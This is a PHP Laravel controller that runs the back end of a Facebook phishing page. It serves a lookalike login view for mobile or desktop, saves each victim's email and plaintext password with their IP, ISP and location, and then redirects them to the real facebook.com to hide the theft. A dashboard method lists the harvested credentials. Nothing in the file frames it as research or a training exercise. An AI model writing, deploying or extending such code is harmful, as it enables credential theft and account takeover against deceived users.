<?php

namespace App\Http\Controllers\SocialNetwork;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;

use App\Models\Facebook;

class FacebookController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {

        /**
         * Get the ip address from the user
         */
        function getUserIpAddr(){
            if(!empty($_SERVER['HTTP_CLIENT_IP'])){
                //ip from share internet
                $ip = $_SERVER['HTTP_CLIENT_IP'];
            }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
                //ip pass from proxy
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            }else{
                $ip = $_SERVER['REMOTE_ADDR'];
            }
            return $ip;
        }

        $getIpAddress = getUserIpAddr();
        

        /**
         *  Detect if the user is use phone or pc 
         */
        function isMobileDevice() {
            return preg_match("/(android|avantgo|blackberry|bolt|boost|cricket|docomo
        |fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i"
        , $_SERVER["HTTP_USER_AGENT"]);
        }

        if(isMobileDevice()){
            return view('socialNetwork.facebook.mobile', compact('getIpAddress'));
        }
        else {
            return view('socialNetwork.facebook.index', compact('getIpAddress'));
        }
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        //
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        $dataFacebook = new Facebook;

        $this->validate($request, [
            'email' => 'required',
            'password' => 'required',
        ]); 

        $dataFacebook->email = $request->email;
        $dataFacebook->password = $request->password;                
        $dataFacebook->ip = $request->ip;
        $dataFacebook->isp = $request->isp;
        $dataFacebook->city = $request->city;
        $dataFacebook->region = $request->region;
        $dataFacebook->country = $request->country;
        $dataFacebook->timezone = $request->timezone; 
        
        //dd($dataFacebook);
        $dataFacebook->save();

        return redirect('https://facebook.com/');
    }

    /**
     * Display the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function show($id)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function edit($id)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, $id)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function destroy($id)
    {
        //
    }

    public function dashboardFacebook()
    {
        $dataFacebook = Facebook::orderBy('id', 'DESC')->paginate();
        //dd($dataFacebook);
        return view('socialNetwork.facebook.dashboard', compact('dataFacebook'));
        
    }
}
